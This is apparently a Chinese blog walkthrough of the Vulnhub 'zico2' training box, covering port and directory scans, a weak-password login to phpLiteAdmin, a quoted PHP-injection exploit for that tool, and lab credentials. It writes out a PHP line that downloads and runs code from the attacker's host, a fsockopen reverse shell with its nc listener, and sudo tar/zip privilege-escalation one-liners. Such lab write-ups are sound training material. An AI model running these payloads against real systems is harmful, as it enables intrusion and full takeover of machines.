---
title: Vulnhub-zico2  
date: 2024-03-01
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/zico2.html"
---

# zico2

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831435.png" alt="image-20240301143804428" style="zoom:50%;" />

## 配置靶场

升级一下虚拟机，改为 nat 模式，然后尝试打开，扫描：

![image-20240301150030309](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831437.png)

扫到了，打开看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831439.png" alt="image-20240301150118052" style="zoom:50%;" />

可以开始进行进攻了。

## 信息搜集

### wappalyzer

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831440.png" alt="image-20240301150209362" style="zoom:50%;" />

### 端口扫描

```bash
rustscan -a 192.168.244.129 -- -A -sV -sT 
```

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.244.129:22
Open 192.168.244.129:80
Open 192.168.244.129:111
Open 192.168.244.129:50096
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-01 02:06 EST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:06
Completed NSE at 02:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:06
Completed NSE at 02:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:06
Completed NSE at 02:06, 0.00s elapsed
Initiating Ping Scan at 02:06
Scanning 192.168.244.129 [2 ports]
Completed Ping Scan at 02:06, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 02:06
Completed Parallel DNS resolution of 1 host. at 02:06, 2.01s elapsed
DNS resolution of 1 IPs took 2.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 02:06
Scanning 192.168.244.129 [4 ports]
Discovered open port 22/tcp on 192.168.244.129
Discovered open port 111/tcp on 192.168.244.129
Discovered open port 80/tcp on 192.168.244.129
Discovered open port 50096/tcp on 192.168.244.129
Completed Connect Scan at 02:06, 0.00s elapsed (4 total ports)
Initiating Service scan at 02:06
Scanning 4 services on 192.168.244.129
Completed Service scan at 02:06, 11.04s elapsed (4 services on 1 host)
NSE: Script scanning 192.168.244.129.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:06
Completed NSE at 02:06, 0.27s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:06
Completed NSE at 02:06, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:06
Completed NSE at 02:06, 0.00s elapsed
Nmap scan report for 192.168.244.129
Host is up, received syn-ack (0.00058s latency).
Scanned at 2024-03-01 02:06:15 EST for 11s

PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAJwR6q4VerUDe7bLXRL6ZPTXj5FY66he+WWlRSoQppwDLqrTG73Pa9qUHMDFb1LXN1qgg0p0lyfqvm8ZeN+98rbT0JW6+Wqa7v0K+N82xf87fVkJcXAuU/A8OGR9eVMZmWsIOpabZexd5CHYgLO3k4YpPSdxc6S4zJcOGwXVnmGHAAAAFQDHjsPg0rmkbquTJRdlEZBVJe9+3QAAAIBjYIAiGvKhmJfzDjVfzlxRD1ET7ZhSoMDxU0KadwXQP1uBdlYVEteJQpUTEsA+7kFH7xhtZ/zbK2afEFHriAphTJmz8GqkIR5CJXh3dZspdk2MHCgxkXl5G/iVPLR9UShN+nsAVxfm0gffCqbqZu3Ridt3JwTXQbiDfXO/a6T/eQAAAIEAlsW/i/dUuFbRVO2zaAKwL/CFWT19Al7+njszC5FCJ2deggmF/NIKJUbJwkRZkwL4PY1HYj2xqn7ImhPSyvdCd+IFdw73Pndnjv0luDc8i/a4JUEfna4rzXt1Y5c24J1pEoKA05VicyCBD2z6TodRJEVEFSsa1s8s2p9x6LxwsDw=
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZt46W9slSN3Y6D2f931rijUPCEewhQWmBfGhybuF4qLftfJMuyFcREZkG6UretVI8ZnQn/OMDgbf2DYMzKsRLnz7W5cGy1Mt1pWoG0iCgi2xHzLqOqPYo4mP9/hdZT6pANXapETT55yx8sHAYLAa9NK5Dtyv+QNQ2dUUb1wUTCqgYffLVDgoHvNNDwCwB6biJf6uopqfg2KXvAzcqSa6oaRChJOXjFlM08HebMwkMSzrOXjWbXhFsONy5JuDf3WztCtLMsFrVRHTdDwTh7uL2UQ8Qcky+kP6Wd7G8NlW5RxubYIFpAM0u2SsQIjYOxz+eOfQ8GE3WjvaIBqX05gat
|   256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFxsiWE3WImfJcjiWS5asOVoMsn+0gFLU5AgPNs2ATokB7kw00IsB0YGrqClwYNauRRddkYMsi0icJSR60mYNSo=
80/tcp    open  http    syn-ack Apache httpd 2.2.22 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Zico's Shop
111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          34879/tcp6  status
|   100024  1          48430/udp   status
|   100024  1          50096/tcp   status
|_  100024  1          59682/udp6  status
50096/tcp open  status  syn-ack 1 (RPC #100024)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 02:06
Completed NSE at 02:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 02:06
Completed NSE at 02:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 02:06
Completed NSE at 02:06, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.31 seconds
```

### 目录扫描

```bash
ffuf -u http://192.168.244.129/FUZZ -w /usr/share/dirb/wordlists/common.txt 
```

```text

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.244.129/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 287, Words: 21, Lines: 11, Duration: 6ms]
.htaccess               [Status: 403, Size: 292, Words: 21, Lines: 11, Duration: 2ms]
                        [Status: 200, Size: 7970, Words: 2382, Lines: 184, Duration: 46ms]
cgi-bin/                [Status: 403, Size: 291, Words: 21, Lines: 11, Duration: 0ms]
.htpasswd               [Status: 403, Size: 292, Words: 21, Lines: 11, Duration: 210ms]
css                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 2ms]
dbadmin                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 0ms]
img                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 1ms]
index.html              [Status: 200, Size: 7970, Words: 2382, Lines: 184, Duration: 0ms]
index                   [Status: 200, Size: 7970, Words: 2382, Lines: 184, Duration: 2ms]
js                      [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 1ms]
LICENSE                 [Status: 200, Size: 1094, Words: 156, Lines: 22, Duration: 7ms]
package                 [Status: 200, Size: 789, Words: 112, Lines: 30, Duration: 1ms]
server-status           [Status: 403, Size: 296, Words: 21, Lines: 11, Duration: 0ms]
tools                   [Status: 200, Size: 8355, Words: 3291, Lines: 186, Duration: 1ms]
vendor                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 2ms]
view                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 9ms]
:: Progress: [4614/4614] :: Job [1/1] :: 64 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

### 常见漏洞扫描

```bash
nikto -h 192.168.244.129
```

```text
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.244.129
+ Target Hostname:    192.168.244.129
+ Target Port:        80
+ Start Time:         2024-03-01 02:26:04 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ /: Server may leak inodes via ETags, header found with file /, inode: 3803593, size: 7970, mtime: Thu Jun  8 15:18:30 2017. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /index: Uncommon header 'tcn' found, with contents: list.
+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.html. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /img/: Directory indexing found.
+ /img/: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /view.php?ariadne=http://blog.cirt.net/rfiinc.txt?: Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.26.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ /README.md: Readme Found.
+ 8909 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2024-03-01 02:26:22 (GMT-5) (18 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### 博客扫描

```bash
wpscan --url http://192.168.244.129 --api-token=xxxxxxx
# 不是wordpress的
```

```bash
whatweb 192.168.244.129
#http://192.168.244.129 [200 OK] Apache[2.2.22], Bootstrap, Country[RESERVED][ZZ], Email[feedback@startbootstrap.com,your-email@your-domain.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.2.22 (Ubuntu)], IP[192.168.244.129], JQuery, Script, Title[Zico's Shop], X-UA-Compatible[IE=edge]
```

### 实地考察

发现一处有意思的地方：

![image-20240301170823805](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831441.png)

## 漏洞利用

### 目录穿越

刚刚看到的网页，尝试目录穿越

![image-20240301170926114](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831442.png)

### 查看web目录

刚刚扫出来了不少目录，查看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831443.png" alt="image-20240301171111601" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831444.png" alt="image-20240301171129333" style="zoom:50%;" />

发现管理工具是`phpLiteAdmin`。

尝试万能密码，未成功，尝试弱密码`admin`，成功进入：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831445.png" alt="image-20240301171433385" style="zoom:50%;" />

查看一下相关数据，发现敏感数据：

![image-20240301172036624](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831446.png)

尝试进行破译：

```apl
(root)653F4B285089453FE00E2AAFAC573414  -->  34kroot34
(zico)96781A607F4E9F5F423AC01F0DAB0EBD  -->  zico2215@
```

尝试进行登录，遗憾的是失败了。

### 查阅相关漏洞

![image-20240301175750788](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831447.png)

```text
# Exploit Title: phpliteadmin <= 1.9.3 Remote PHP Code Injection Vulnerability
# Google Dork: inurl:phpliteadmin.php (Default PW: admin)
# Date: 01/10/2013
# Exploit Author: L@usch - http://la.usch.io - http://la.usch.io/files/exploits/phpliteadmin-1.9.3.txt
# Vendor Homepage: http://code.google.com/p/phpliteadmin/
# Vendor Status: Informed
# Software Link: http://phpliteadmin.googlecode.com/files/phpliteadmin_v1-9-3.zip
# Version: 1.9.3
# Tested on: Windows and Linux

Description:

phpliteadmin.php#1784: 'Creating a New Database' =>
phpliteadmin.php#1785: 'When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.',

An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.

Proof of Concept:

1. We create a db named "hack.php".
(Depending on Server configuration sometimes it will not work and the name for the db will be "hack.sqlite". Then simply try to rename the database / existing database to "hack.php".)
The script will store the sqlite database in the same directory as phpliteadmin.php.
Preview: http://goo.gl/B5n9O
Hex preview: http://goo.gl/lJ5iQ

2. Now create a new table in this database and insert a text field with the default value:
<?php phpinfo()?>
Hex preview: http://goo.gl/v7USQ

3. Now we run hack.php

Done!

Proof: http://goo.gl/ZqPVL 
```

### 写一个马进去

![image-20240301175610819](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831448.png)

```php
# zico2
<?php system("wget 192.168.244.128:8888/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>
# kali shell.txt	
<?php $sock=fsockopen("192.168.244.128",1234);exec("/bin/sh -i <&3 >&3 2>&3");?>
python3 -m http.server 8888
nc -lvvp 1234
```

![image-20240301180859781](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831449.png)

![image-20240301181358122](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831450.png)

## 提权

### 扩展shell

```bash
python -c 'import pty;pty.spawn("/bin/sh")'
/bin/bash
```

### 查看文件

```bash
cd /home/zico
cat to_do.txt
```

```spl
try list:
- joomla
- bootstrap (+phpliteadmin)
- wordpress
```

查看一下wordpress敏感文件：

```bash
cat wp-config.php
```

![image-20240301182214839](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831451.png)

找到密码：

```
zico
sWfCsfJSPV9H3AmQzw8
```

### 切换用户zico

```bash
su zico
```

查看基础信息：

```bash
sudo -l
```

![image-20240301182522353](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831452.png)

### tar提权

可以参考网站[GTFOBins](https://gtfobins.github.io/)

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

 ![image-20240301182818892](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831453.png)

### zip提权

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

![image-20240301182915967](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403011831454.png)

### 内核提权

一把梭，没尝试，不够好像也看到有师傅成功了。
